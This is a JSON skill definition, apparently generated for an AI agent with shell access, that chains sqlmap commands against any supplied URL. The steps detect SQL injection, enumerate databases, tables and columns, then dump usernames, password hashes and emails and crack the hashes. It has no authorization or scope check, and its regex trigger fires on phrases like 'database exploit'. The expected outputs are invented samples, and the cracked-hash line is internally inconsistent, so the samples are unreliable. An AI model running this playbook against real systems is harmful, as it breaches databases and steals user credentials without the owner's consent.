{
  "name": "sqlmap_basic_injection",
  "description": "Automated SQL injection detection and exploitation using sqlmap",
  "pattern": "sqlmap.*inject|sql.*injection.*test|sqlmap.*url|database.*exploit",
  "parameters": ["target_url", "parameter"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--batch", "--banner"]},
      "expected_output": {"type": "string", "example": "        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.7.2#stable}\n|_ -| . [']     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[*] starting @ 15:30:24 /2024-03-15/\n\n[15:30:24] [INFO] testing connection to the target URL\n[15:30:25] [INFO] testing if the target URL content is stable\n[15:30:26] [INFO] target URL content is stable\n[15:30:26] [INFO] testing if GET parameter 'id' is dynamic\n[15:30:27] [INFO] GET parameter 'id' appears to be dynamic\n[15:30:28] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[15:30:29] [INFO] testing for SQL injection on GET parameter 'id'\n[15:30:35] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable\n\nweb server operating system: Linux Ubuntu\nweb application technology: Apache 2.4.41, PHP 7.4.3\nback-end DBMS: MySQL >= 5.0\nbanner: '5.7.33-0ubuntu0.18.04.1'"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--dbs", "--batch"]},
      "expected_output": {"type": "string", "example": "[15:31:15] [INFO] fetching database names\n[15:31:16] [INFO] retrieved: 'information_schema'\n[15:31:17] [INFO] retrieved: 'mysql'\n[15:31:18] [INFO] retrieved: 'performance_schema'\n[15:31:19] [INFO] retrieved: 'webapp_db'\n[15:31:20] [INFO] retrieved: 'test_database'\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] test_database\n[*] webapp_db"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "-D", "webapp_db", "--tables", "--batch"]},
      "expected_output": {"type": "string", "example": "[15:32:10] [INFO] fetching tables for database: 'webapp_db'\n[15:32:12] [INFO] retrieved: 'users'\n[15:32:13] [INFO] retrieved: 'products'\n[15:32:14] [INFO] retrieved: 'orders'\n[15:32:15] [INFO] retrieved: 'sessions'\n[15:32:16] [INFO] retrieved: 'admin_users'\nDatabase: webapp_db\n[5 tables]\n+-------------+\n| admin_users |\n| orders      |\n| products    |\n| sessions    |\n| users       |\n+-------------+"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "-D", "webapp_db", "-T", "users", "--columns", "--batch"]},
      "expected_output": {"type": "string", "example": "[15:33:20] [INFO] fetching columns for table 'users' in database 'webapp_db'\nDatabase: webapp_db\nTable: users\n[6 columns]\n+-------------+-------------+\n| Column      | Type        |\n+-------------+-------------+\n| id          | int(11)     |\n| username    | varchar(50) |\n| password    | varchar(64) |\n| email       | varchar(100)|\n| created_at  | timestamp   |\n| role        | varchar(20) |\n+-------------+-------------+"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "-D", "webapp_db", "-T", "users", "-C", "username,password,email", "--dump", "--batch"]},
      "expected_output": {"type": "string", "example": "[15:34:30] [INFO] fetching entries for table 'users' in database 'webapp_db'\n[15:34:31] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n[15:34:32] [INFO] using hash method 'sha256_generic_passwd'\n[15:34:35] [INFO] cracked password 'admin123' for hash '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'\nDatabase: webapp_db\nTable: users\n[3 entries]\n+----------+------------------------------------------------------------------+---------------------+\n| username | password                                                         | email               |\n+----------+------------------------------------------------------------------+---------------------+\n| admin    | 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 (admin123) | admin@webapp.com    |\n| john_doe | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8         | john@example.com    |\n| testuser | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f         | test@test.com       |\n+----------+------------------------------------------------------------------+---------------------+"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
